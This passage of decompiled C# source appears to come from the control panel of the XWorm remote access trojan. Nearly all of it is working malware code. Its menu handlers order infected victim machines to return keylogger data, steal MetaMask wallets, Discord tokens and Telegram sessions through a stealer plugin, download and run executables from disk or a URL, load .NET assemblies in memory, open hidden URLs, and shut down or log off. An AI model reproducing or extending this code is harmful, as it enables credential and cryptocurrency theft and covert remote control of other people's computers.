			base.Close();
		}

		// Token: 0x06000443 RID: 1091 RVA: 0x000247C0 File Offset: 0x000229C0
		private void ToolStripMenuItem6_Click(object sender, EventArgs e)
		{
			try
			{
				SettingsHelper.Screens = false;
				this.ThumbnailCap.Dispose();
				this.Lv4.Items.Clear();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000444 RID: 1092 RVA: 0x00024814 File Offset: 0x00022A14
		private void ToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			SettingsHelper.Screens = true;
			this.ThumbnailCap.Enabled = true;
			this.ThumbnailCap.Start();
		}

		// Token: 0x06000445 RID: 1093 RVA: 0x00024836 File Offset: 0x00022A36
		private void ToolStripMenuItem7_Click(object sender, EventArgs e)
		{
			this.Lv2.Items.Clear();
		}

		// Token: 0x06000446 RID: 1094 RVA: 0x0002484C File Offset: 0x00022A4C
		private void Guna2Button5_Click(object sender, EventArgs e)
		{
			new About
			{
				StartPosition = FormStartPosition.CenterParent
			}.ShowDialog();
		}

		// Token: 0x06000447 RID: 1095 RVA: 0x00003234 File Offset: 0x00001434
		private void Guna2TextBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000448 RID: 1096 RVA: 0x00024870 File Offset: 0x00022A70
		private void Guna2TextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			bool flag = e.KeyCode == Keys.Return;
			if (flag)
			{
				e.SuppressKeyPress = true;
				try
				{
					bool flag2 = this.Lv1.Items.Count > 0;
					if (flag2)
					{
						try
						{
							foreach (object obj in this.Lv1.SelectedItems)
							{
								ListViewItem listViewItem = (ListViewItem)obj;
								listViewItem.Selected = false;
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
						bool flag3 = false;
						string value = this.Guna2TextBox1.Text.ToLower();
						try
						{
							foreach (object obj2 in this.Lv1.Items)
							{
								ListViewItem listViewItem2 = (ListViewItem)obj2;
								try
								{
									string text = listViewItem2.SubItems[0].Text.ToLower();
									string text2 = listViewItem2.SubItems[2].Text.ToLower();
									string text3 = listViewItem2.SubItems[3].Text.ToLower();
									string text4 = listViewItem2.SubItems[5].Text.ToLower();
									string text5 = listViewItem2.SubItems[10].Text.ToLower();
									string text6 = listViewItem2.SubItems[11].Text.ToLower();
									string text7 = listViewItem2.SubItems[12].Text.ToLower();
									string text8 = listViewItem2.SubItems[14].Text.ToLower();
									string text9 = listViewItem2.SubItems[17].Text.ToLower();
									bool flag4 = text.Contains(value) | text2.Contains(value) | text3.Contains(value) | text4.Contains(value) | text5.Contains(value) | text6.Contains(value) | text7.Contains(value) | text8.Contains(value) | text9.Contains(value);
									if (flag4)
									{
										listViewItem2.Selected = true;
										flag3 = true;
									}
								}
								catch (Exception ex)
								{
								}
							}
						}
						finally
						{
							IEnumerator enumerator2;
							if (enumerator2 is IDisposable)
							{
								(enumerator2 as IDisposable).Dispose();
							}
						}
						bool flag5 = flag3;
						if (flag5)
						{
							this.Lv1.EnsureVisible(this.Lv1.SelectedItems[0].Index);
							this.Guna2TextBox1.Clear();
							bool flag6 = !this.Lv1.Visible;
							if (flag6)
							{
								this.Lv2.Visible = false;
								this.Lv3.Visible = false;
								this.Lv4.Visible = false;
								this.Lv1.Visible = true;
							}
						}
					}
				}
				catch (Exception ex2)
				{
					Debug.WriteLine(ex2.Message);
				}
			}
		}

		// Token: 0x06000449 RID: 1097 RVA: 0x00024BCC File Offset: 0x00022DCC
		private void Guna2Button6_Click(object sender, EventArgs e)
		{
			try
			{
				ToolsBox toolsBox = new ToolsBox();
				toolsBox.StartPosition = FormStartPosition.Manual;
				toolsBox.Location = checked(new Point(base.Location.X + base.Width / 2 - toolsBox.Width / 2, base.Location.Y + base.Height / 2 - toolsBox.Height / 2));
				bool flag = Application.OpenForms[toolsBox.Name] == null;
				if (flag)
				{
					toolsBox.Show();
				}
				else
				{
					Application.OpenForms[toolsBox.Name].Focus();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600044A RID: 1098 RVA: 0x00024C9C File Offset: 0x00022E9C
		private void Guna2Button7_Click(object sender, EventArgs e)
		{
			new Builder
			{
				StartPosition = FormStartPosition.CenterParent
			}.ShowDialog();
		}

		// Token: 0x0600044B RID: 1099 RVA: 0x00024CC0 File Offset: 0x00022EC0
		private void KeyloggerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv3.Items.Count > 0;
			if (flag)
			{
				try
				{
					foreach (object obj in this.Lv3.Items)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						bool flag2 = Operators.CompareString(listViewItem.Text, "Get Keylogger", false) == 0;
						if (flag2)
						{
							return;
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			ListViewItem listViewItem2 = new ListViewItem();
			listViewItem2.Text = "Get Keylogger";
			listViewItem2.SubItems.Add("0");
			listViewItem2.ToolTipText = Guid.NewGuid().ToString();
			this.Lv3.Items.Add(listViewItem2);
			this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
			byte[] msgPack = Helper.SB("OfflineGet");
			this.getTasks.Add(new XWormTask(msgPack, listViewItem2.ToolTipText));
		}

		// Token: 0x0600044C RID: 1100 RVA: 0x00024DDC File Offset: 0x00022FDC
		private void VisibleToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			object obj = Interaction.InputBox("Enter Your Url", "Open Visible Url", "http://exmple.com", -1, -1);
			bool flag = !string.IsNullOrWhiteSpace(Conversions.ToString(obj));
			if (flag)
			{
				byte[] msgPack = Helper.SB(Conversions.ToString(Operators.ConcatenateObject("Urlopen" + SettingsHelper.SPL, obj)));
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = Conversions.ToString(Operators.ConcatenateObject("VisibleUrl: ", obj));
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				this.Lv3.Items.Add(listViewItem);
				this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				this.getTasks.Add(new XWormTask(msgPack, listViewItem.ToolTipText));
			}
		}

		// Token: 0x0600044D RID: 1101 RVA: 0x00024EB8 File Offset: 0x000230B8
		private void InvisibleToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			object obj = Interaction.InputBox("Enter Your Url", "Open Invisible Url", "http://exmple.com", -1, -1);
			bool flag = !string.IsNullOrWhiteSpace(Conversions.ToString(obj));
			if (flag)
			{
				byte[] msgPack = Helper.SB(Conversions.ToString(Operators.ConcatenateObject("Urlhide" + SettingsHelper.SPL, obj)));
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = Conversions.ToString(Operators.ConcatenateObject("InvisibleUrl: ", obj));
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				this.Lv3.Items.Add(listViewItem);
				this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				this.getTasks.Add(new XWormTask(msgPack, listViewItem.ToolTipText));
			}
		}

		// Token: 0x0600044E RID: 1102 RVA: 0x00024F94 File Offset: 0x00023194
		private void MetaMaskToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.Lv3.Items.Count > 0;
				if (flag)
				{
					try
					{
						foreach (object obj in this.Lv3.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							bool flag2 = Operators.CompareString(listViewItem.Text, "MetaMask", false) == 0;
							if (flag2)
							{
								return;
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				ListViewItem listViewItem2 = new ListViewItem();
				listViewItem2.Text = "MetaMask";
				listViewItem2.SubItems.Add("0");
				listViewItem2.ToolTipText = Guid.NewGuid().ToString();
				this.Lv3.Items.Add(listViewItem2);
				this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				byte[] msgPack = Helper.SB(string.Concat(new string[]
				{
					"plugin",
					SettingsHelper.SPL,
					Helper.GetChecksum("Plugins\\Stealer.dll"),
					SettingsHelper.SPL,
					Conversions.ToString(5)
				}));
				this.getTasks.Add(new XWormTask(msgPack, listViewItem2.ToolTipText));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x0600044F RID: 1103 RVA: 0x0002512C File Offset: 0x0002332C
		private void DiscordTokenToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.Lv3.Items.Count > 0;
				if (flag)
				{
					try
					{
						foreach (object obj in this.Lv3.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							bool flag2 = Operators.CompareString(listViewItem.Text, "DiscordToken", false) == 0;
							if (flag2)
							{
								return;
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				ListViewItem listViewItem2 = new ListViewItem();
				listViewItem2.Text = "DiscordToken";
				listViewItem2.SubItems.Add("0");
				listViewItem2.ToolTipText = Guid.NewGuid().ToString();
				this.Lv3.Items.Add(listViewItem2);
				this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				byte[] msgPack = Helper.SB(string.Concat(new string[]
				{
					"plugin",
					SettingsHelper.SPL,
					Helper.GetChecksum("Plugins\\Stealer.dll"),
					SettingsHelper.SPL,
					Conversions.ToString(2)
				}));
				this.getTasks.Add(new XWormTask(msgPack, listViewItem2.ToolTipText));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000450 RID: 1104 RVA: 0x000252C4 File Offset: 0x000234C4
		private void TelegramSessionToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.Lv3.Items.Count > 0;
				if (flag)
				{
					try
					{
						foreach (object obj in this.Lv3.Items)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							bool flag2 = Operators.CompareString(listViewItem.Text, "TelegramSession", false) == 0;
							if (flag2)
							{
								return;
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				ListViewItem listViewItem2 = new ListViewItem();
				listViewItem2.Text = "TelegramSession";
				listViewItem2.SubItems.Add("0");
				listViewItem2.ToolTipText = Guid.NewGuid().ToString();
				this.Lv3.Items.Add(listViewItem2);
				this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				byte[] msgPack = Helper.SB(string.Concat(new string[]
				{
					"plugin",
					SettingsHelper.SPL,
					Helper.GetChecksum("Plugins\\Stealer.dll"),
					SettingsHelper.SPL,
					Conversions.ToString(4)
				}));
				this.getTasks.Add(new XWormTask(msgPack, listViewItem2.ToolTipText));
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000451 RID: 1105 RVA: 0x0002545C File Offset: 0x0002365C
		private void FromDiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				OpenFileDialog openFileDialog2 = openFileDialog;
				openFileDialog2.Filter = "(*.*)|*.*";
				openFileDialog2.Title = "From Disk";
				bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					byte[] msgPack = Helper.SB(string.Concat(new string[]
					{
						"DW",
						SettingsHelper.SPL,
						Path.GetExtension(openFileDialog.FileName),
						SettingsHelper.SPL,
						Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(openFileDialog.FileName)))
					}));
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "FromDisk: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					this.Lv3.Items.Add(listViewItem);
					this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					this.getTasks.Add(new XWormTask(msgPack, listViewItem.ToolTipText));
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		// Token: 0x06000452 RID: 1106 RVA: 0x000255B8 File Offset: 0x000237B8
		private void FromLinkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string defaultResponse = "http://www.example.com/File.exe";
			string text = Interaction.InputBox("Url", "From Url", defaultResponse, -1, -1);
			string text2 = Interaction.InputBox("Extension", "From Url", ".exe", -1, -1);
			bool flag = text.Length == 0 | text2.Length == 0;
			if (!flag)
			{
				byte[] msgPack = Helper.SB(string.Concat(new string[]
				{
					"LN",
					SettingsHelper.SPL,
					text2,
					SettingsHelper.SPL,
					text
				}));
				ListViewItem listViewItem = new ListViewItem();
				listViewItem.Text = "FromLink: " + text2;
				listViewItem.SubItems.Add("0");
				listViewItem.ToolTipText = Guid.NewGuid().ToString();
				this.Lv3.Items.Add(listViewItem);
				this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
				this.getTasks.Add(new XWormTask(msgPack, listViewItem.ToolTipText));
			}
		}

		// Token: 0x06000453 RID: 1107 RVA: 0x000256CC File Offset: 0x000238CC
		private void FromMemoryToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				OpenFileDialog openFileDialog2 = openFileDialog;
				openFileDialog2.Filter = "(*.exe)|*.exe";
				openFileDialog2.Title = "From Memory";
				bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
				if (flag)
				{
					try
					{
						Assembly.LoadFile(openFileDialog.FileName).EntryPoint.GetParameters();
					}
					catch (Exception ex)
					{
						MessageBox.Show(openFileDialog.FileName, "Is Not A .NET Assembly");
						return;
					}
					byte[] msgPack = Helper.SB("FM" + SettingsHelper.SPL + Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(openFileDialog.FileName))));
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "FromMemory: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					this.Lv3.Items.Add(listViewItem);
					this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					this.getTasks.Add(new XWormTask(msgPack, listViewItem.ToolTipText));
				}
			}
			catch (Exception ex2)
			{
				MessageBox.Show(ex2.Message);
			}
		}

		// Token: 0x06000454 RID: 1108 RVA: 0x00025858 File Offset: 0x00023A58
		private void UpdateAllClientsToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			DialogResult dialogResult = openFileDialog.ShowDialog();
			bool flag = dialogResult == DialogResult.OK;
			if (flag)
			{
				try
				{
					byte[] msgPack = Helper.SB(string.Concat(new string[]
					{
						"update",
						SettingsHelper.SPL,
						Path.GetExtension(openFileDialog.FileName),
						SettingsHelper.SPL,
						Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(openFileDialog.FileName)))
					}));
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = "Update: " + Path.GetFileName(openFileDialog.FileName);
					listViewItem.SubItems.Add("0");
					listViewItem.ToolTipText = Guid.NewGuid().ToString();
					this.Lv3.Items.Add(listViewItem);
					this.Lv3.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					this.getTasks.Add(new XWormTask(msgPack, listViewItem.ToolTipText));
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000455 RID: 1109 RVA: 0x0002598C File Offset: 0x00023B8C
		private void RemoveTaskToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv3.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					foreach (object obj in this.Lv3.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						listViewItem.Remove();
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000456 RID: 1110 RVA: 0x00025A0C File Offset: 0x00023C0C
		private void InformationToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					byte[] state = Helper.SB("plugin" + SettingsHelper.SPL + Helper.GetChecksum("Plugins\\Informations.dll"));
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R811-6 CS$<>8__locals1 = new Main._Closure$__R811-6(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000457 RID: 1111 RVA: 0x00025AFC File Offset: 0x00023CFC
		private void RestartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("rec");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R812-8 CS$<>8__locals1 = new Main._Closure$__R812-8(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000458 RID: 1112 RVA: 0x00025BA8 File Offset: 0x00023DA8
		private void CloseToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("CLOSE");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R813-10 CS$<>8__locals1 = new Main._Closure$__R813-10(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000459 RID: 1113 RVA: 0x00025C54 File Offset: 0x00023E54
		private void UninstallToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				int num = (int)MessageBox.Show("Are You Sure?", "Uninstall!", MessageBoxButtons.YesNo);
				bool flag2 = num == 6;
				if (flag2)
				{
					byte[] state = Helper.SB("uninstall");
					try
					{
						foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj;
							Main._Closure$__R814-12 CS$<>8__locals1 = new Main._Closure$__R814-12(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		// Token: 0x0600045A RID: 1114 RVA: 0x00025D24 File Offset: 0x00023F24
		private void UpdateToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				DialogResult dialogResult = openFileDialog.ShowDialog();
				bool flag2 = dialogResult == DialogResult.OK;
				if (flag2)
				{
					try
					{
						byte[] state = Helper.SB(string.Concat(new string[]
						{
							"update",
							SettingsHelper.SPL,
							Path.GetExtension(openFileDialog.FileName),
							SettingsHelper.SPL,
							Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(openFileDialog.FileName)))
						}));
						try
						{
							foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
							{
								Client $VB$NonLocal_ = (Client)obj;
								Main._Closure$__R815-14 CS$<>8__locals1 = new Main._Closure$__R815-14(CS$<>8__locals1);
								CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
								ThreadPool.QueueUserWorkItem(delegate(object a0)
								{
									CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
								}, state);
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.Message);
					}
				}
			}
		}

		// Token: 0x0600045B RID: 1115 RVA: 0x00025E68 File Offset: 0x00024068
		private void NoteToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				string text = Interaction.InputBox("Enter Your Note", "Note", "", -1, -1);
				try
				{
					try
					{
						foreach (object obj in this.Lv1.SelectedItems)
						{
							ListViewItem listViewItem = (ListViewItem)obj;
							Helper.NewNotes(listViewItem.SubItems[2].Text, text);
							bool flag2 = string.IsNullOrEmpty(text);
							if (flag2)
							{
								listViewItem.SubItems[14].Text = "Null";
							}
							else
							{
								listViewItem.SubItems[14].Text = text;
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					this.Lv1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
					this._ActiveWindow.Width = 500;
				}
				catch (Exception ex)
				{
					Debug.WriteLine(ex.Message);
				}
			}
		}

		// Token: 0x0600045C RID: 1116 RVA: 0x00025F9C File Offset: 0x0002419C
		private void VisibleToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				object obj = Interaction.InputBox("Enter Your Url", "Open Visible Url", "http://exmple.com", -1, -1);
				bool flag2 = !string.IsNullOrWhiteSpace(Conversions.ToString(obj));
				if (flag2)
				{
					byte[] state = Helper.SB(Conversions.ToString(Operators.ConcatenateObject("Urlopen" + SettingsHelper.SPL, obj)));
					try
					{
						foreach (object obj2 in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj2;
							Main._Closure$__R817-16 CS$<>8__locals1 = new Main._Closure$__R817-16(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		// Token: 0x0600045D RID: 1117 RVA: 0x00026094 File Offset: 0x00024294
		private void InvisibleToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				object obj = Interaction.InputBox("Enter Your Url", "Open Invisible Url", "http://exmple.com", -1, -1);
				bool flag2 = !string.IsNullOrWhiteSpace(Conversions.ToString(obj));
				if (flag2)
				{
					byte[] state = Helper.SB(Conversions.ToString(Operators.ConcatenateObject("Urlhide" + SettingsHelper.SPL, obj)));
					try
					{
						foreach (object obj2 in ((IEnumerable)this.GetSelectedClients()))
						{
							Client $VB$NonLocal_ = (Client)obj2;
							Main._Closure$__R818-18 CS$<>8__locals1 = new Main._Closure$__R818-18(CS$<>8__locals1);
							CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
							ThreadPool.QueueUserWorkItem(delegate(object a0)
							{
								CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
							}, state);
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
			}
		}

		// Token: 0x0600045E RID: 1118 RVA: 0x0002618C File Offset: 0x0002438C
		private void ShutdownToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("PCShutdown");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R819-20 CS$<>8__locals1 = new Main._Closure$__R819-20(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x0600045F RID: 1119 RVA: 0x00026238 File Offset: 0x00024438
		private void RestartToolStripMenuItem4_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("PCRestart");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R820-22 CS$<>8__locals1 = new Main._Closure$__R820-22(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000460 RID: 1120 RVA: 0x000262E4 File Offset: 0x000244E4
		private void LogoffToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				byte[] state = Helper.SB("PCLogoff");
				try
				{
					foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
					{
						Client $VB$NonLocal_ = (Client)obj;
						Main._Closure$__R821-24 CS$<>8__locals1 = new Main._Closure$__R821-24(CS$<>8__locals1);
						CS$<>8__locals1.$VB$NonLocal_2 = $VB$NonLocal_;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							CS$<>8__locals1.$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x06000461 RID: 1121 RVA: 0x00026390 File Offset: 0x00024590
		private async void DiskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				try
				{
					Main._Closure$__822-1 CS$<>8__locals1 = new Main._Closure$__822-1(CS$<>8__locals1);
					CS$<>8__locals1.$VB$Local_o = new OpenFileDialog();
					OpenFileDialog openFileDialog = CS$<>8__locals1.$VB$Local_o;
					openFileDialog.Filter = "(*.*)|*.*";
					openFileDialog.Title = "From Disk";
					openFileDialog = null;
					bool flag2 = CS$<>8__locals1.$VB$Local_o.ShowDialog() == DialogResult.OK;
					if (flag2)
					{
						Main._Closure$__822-0 CS$<>8__locals2 = new Main._Closure$__822-0(CS$<>8__locals2);
						CS$<>8__locals2.$VB$NonLocal_$VB$Closure_3 = CS$<>8__locals1;
						await Task.Run(delegate()
						{
							CS$<>8__locals2.$VB$Local_B = Helper.SB(string.Concat(new string[]
							{
								"DW",
								SettingsHelper.SPL,
								Path.GetExtension(CS$<>8__locals2.$VB$NonLocal_$VB$Closure_3.$VB$Local_o.FileName),
								SettingsHelper.SPL,
								Convert.ToBase64String(Helper.Compress(File.ReadAllBytes(CS$<>8__locals2.$VB$NonLocal_$VB$Closure_3.$VB$Local_o.FileName)))
							}));
						});
						try
						{
							foreach (object obj in ((IEnumerable)this.GetSelectedClients()))
							{
								Client C = (Client)obj;
								Main._Closure$__R822-26 CS$<>8__locals3 = new Main._Closure$__R822-26(CS$<>8__locals3);
								CS$<>8__locals3.$VB$NonLocal_2 = C;
								ThreadPool.QueueUserWorkItem(delegate(object a0)
								{
									CS$<>8__locals3.$VB$NonLocal_2.BeginSend((byte[])a0);
								}, CS$<>8__locals2.$VB$Local_B);
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
				}
			}
		}

		// Token: 0x06000462 RID: 1122 RVA: 0x000263D8 File Offset: 0x000245D8
		private void LinkToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.Lv1.SelectedItems.Count > 0;
			if (flag)
			{
				string defaultResponse = "http://www.example.com/File.exe";
				string text = Interaction.InputBox("Url", "From Url", defaultResponse, -1, -1);
				string text2 = Interaction.InputBox("Extension", "From Url", ".exe", -1, -1);
				bool flag2 = text.Length == 0 | text2.Length == 0;
